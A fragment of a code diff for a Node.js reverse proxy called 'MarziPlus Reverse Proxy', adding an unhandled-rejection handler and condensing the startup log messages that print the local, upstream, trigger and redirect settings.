-    );
-  }
-);
+process.on("unhandledRejection", error => {
+  console.error("❌ unhandledRejection:", error);
+});
 
 /*
 |--------------------------------------------------------------------------
-| START
+| START SERVER
 |--------------------------------------------------------------------------
 */
 
-server.listen(
-  PROXY_PORT,
-  PROXY_HOST,
-  () => {
-
-    console.log("");
-
-    console.log(
-      "=========================================="
-    );
-
-    console.log(
-      " MarziPlus Reverse Proxy"
-    );
-
-    console.log(
-      "=========================================="
-    );
-
-    console.log(
-      `Public:    ${PROXY_PUBLIC_DOMAIN}`
-    );
-
-    console.log(
-      `Local:     http://${PROXY_HOST}:${PROXY_PORT}`
-    );
-
-    console.log(
-      `Upstream:  https://${TARGET_HOSTNAME}`
-    );
-
-    console.log(
-      `Trigger:   ${REDIRECT_API_PATH}`
-    );
-
-    console.log(
-      `Redirect:  ${REDIRECT_BASE_URL}?phone=...`
-    );
-
-    console.log(
-      "=========================================="
-    );
-
-    console.log("");
-  }
-);
+server.listen(PROXY_PORT, PROXY_HOST, () => {
+  console.log("\n==========================================");
+  console.log(" MarziPlus Reverse Proxy");
+  console.log("==========================================");
+  console.log(`Local:    http://${PROXY_HOST}:${PROXY_PORT}`);
+  console.log(`Upstream: https://${TARGET_HOSTNAME}`);
+  console.log(`Trigger:  ${REDIRECT_API_PATH}`);
+  console.log(`Redirect: ${REDIRECT_BASE_URL}`);
+  console.log("==========================================\n");
+});
